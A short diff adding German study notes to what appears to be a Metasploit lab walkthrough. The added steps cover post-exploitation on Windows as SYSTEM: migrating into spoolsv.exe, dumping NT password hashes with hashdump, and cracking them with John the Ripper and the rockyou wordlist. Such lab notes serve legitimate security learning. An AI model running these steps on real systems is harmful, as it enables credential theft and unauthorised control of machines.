@@ -56,6 +56,18 @@ set LPORT 4445
 => wir sollten jetzt eine 2 Session haben. 
 7. sessions -i 2
 => Startet eine Interaktion 
-8.  
-
+8. getuid
+=> NT AUTHORITIY\SYSTEM
+9. shell
+10. whoami
+11. strg + z
+12. ps
+=> spoolsv.exe, hängt sich an diesen Prozessor, x64, NT AUTHORITY\SYSTEM
+13. migrate (Prozessid)
+14. getuid
+15. hashdump
+=> copy key vom john
+16. echo "john"
+17. john jon.hash --format=NT --wordlist=/opt/rockyou.txt
+18. 
 
